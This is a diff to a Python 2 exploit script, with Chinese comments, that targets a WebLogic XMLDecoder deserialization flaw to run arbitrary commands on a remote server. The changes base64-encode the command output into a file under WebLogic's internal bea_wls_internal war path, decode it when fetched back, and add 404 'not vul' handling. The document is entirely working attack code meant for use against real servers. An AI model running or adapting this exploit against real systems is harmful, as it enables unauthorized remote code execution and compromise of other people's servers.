@@ -26,7 +26,8 @@ def payload_command(command_in,output_file):
         "<": "&lt;",
     }
     #命令执行回显：将命令执行的结果输出到文件中
-    command_in_payload = 'find . -name index.html| while read path_file;do {} >$(dirname $path_file)/{};done'.format(command_in,output_file)
+    #command_in_payload = 'find . -name index.html| while read path_file;do {} >$(dirname $path_file)/{};done'.format(command_in,output_file)
+    command_in_payload = '{} |base64 > ./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}'.format(command_in,output_file)
     command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in_payload)+"</string>"
     #XMLDecoder反序列化payload:
 
@@ -64,7 +65,7 @@ def get_output(target,output_file):
     try:
         r = requests.get(output_url,headers = headers,proxies=proxies,timeout=timeout)
         if r.status_code == requests.codes.ok:
-            return (True,r.text.strip())
+            return (True,base64.b64decode(r.text.strip()))
         else:
             return (False,r.status_code)
     except Exception,ex:
@@ -84,10 +85,12 @@ def weblogic_rce(target,cmd,output_file):
         #500时说明已成功反序列化执行命令
         if r.status_code == 500:
             #delay一下，保证命令执行完整性：
-            time.sleep(1)
+            #time.sleep(1)
             return get_output(target,output_file)
+        elif r.status_code == 404:
+            return (False,'404 not vul')
         else:
-            return (False,'{},Something Went Wrong'.format(r.status_code))
+            return (False,'{} exist vul but something went wrong'.format(r.status_code))
     except requests.exceptions.ReadTimeout:
         return (False,'timeout')
     except Exception,ex:
